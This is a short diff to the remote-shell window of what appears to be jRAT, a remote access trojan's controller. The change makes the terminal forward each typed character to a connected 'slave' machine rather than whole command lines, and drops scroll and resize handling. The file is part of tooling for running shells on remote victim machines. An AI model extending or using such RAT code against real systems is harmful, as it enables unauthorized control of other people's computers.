@@ -2,15 +2,12 @@ package se.jrat.controller.ui.frames;
 
 import java.awt.BorderLayout;
 import java.awt.Toolkit;
-import java.awt.event.AdjustmentEvent;
-import java.awt.event.AdjustmentListener;
 import java.awt.event.WindowAdapter;
 import java.awt.event.WindowEvent;
 import java.util.HashMap;
 import java.util.Map;
 
 import javax.swing.JFrame;
-import javax.swing.JScrollBar;
 import javax.swing.JScrollPane;
 
 import se.jrat.controller.Slave;
@@ -20,7 +17,6 @@ import se.jrat.controller.packets.outgoing.Packet25RemoteShellExecute;
 
 import com.redpois0n.terminal.InputListener;
 import com.redpois0n.terminal.JTerminal;
-import com.redpois0n.terminal.SizeChangeListener;
 
 @SuppressWarnings("serial")
 public class FrameRemoteShell extends BaseFrame {
@@ -47,41 +43,17 @@ public class FrameRemoteShell extends BaseFrame {
 		scrollPane = new JScrollPane();
 		terminal = new JTerminal();
 		scrollPane.setViewportView(terminal);
-		
-		scrollPane.getVerticalScrollBar().addAdjustmentListener(new AdjustmentListener() {  
-		    public void adjustmentValueChanged(AdjustmentEvent e) {  
-		    	if (terminal.scrollToBottom()) {
-		    		boolean scrollUp = terminal.scrollUp();
-		    		e.getAdjustable().setValue(scrollUp ? 0 : e.getAdjustable().getMaximum());  
-		    	}
-		    }
-		});
-		
+
 		terminal.addInputListener(new InputListener() {
 			@Override
-			public void processCommand(JTerminal terminal, String command) {
-                if (command.equalsIgnoreCase("clear") || command.equalsIgnoreCase("cls")) {
-                    return;
-                }
-                send(command + "\n");
-                terminal.setBlockAtCurrentPos();
+			public void processCommand(JTerminal terminal, char c) {
+                send(c);
 			}
 			
 			@Override
 			public void onTerminate(JTerminal terminal) {
 				slave.addToSendQueue(new Packet24RemoteShellStop());
 				slave.addToSendQueue(new Packet23RemoteShellStart());
-			}
-		});
-		
-		terminal.addSizeChangeListener(new SizeChangeListener() {
-			@Override
-			public void sizeChange(JTerminal terminal, boolean reset, int width, int height) {
-				JScrollBar vertical = scrollPane.getVerticalScrollBar();
-				scrollPane.revalidate();
-				vertical.revalidate();
-				vertical.setValue(reset ? 0 : vertical.getMaximum());
-				terminal.revalidate();
 			}
 		});
 		
@@ -93,8 +65,8 @@ public class FrameRemoteShell extends BaseFrame {
 		slave.addToSendQueue(new Packet23RemoteShellStart());
 	}
 	
-	private void send(String command) {
-        slave.addToSendQueue(new Packet25RemoteShellExecute(command));
+	private void send(char c) {
+        slave.addToSendQueue(new Packet25RemoteShellExecute(Character.toString(c)));
 	}
 	
 	public JTerminal getTerminal() {
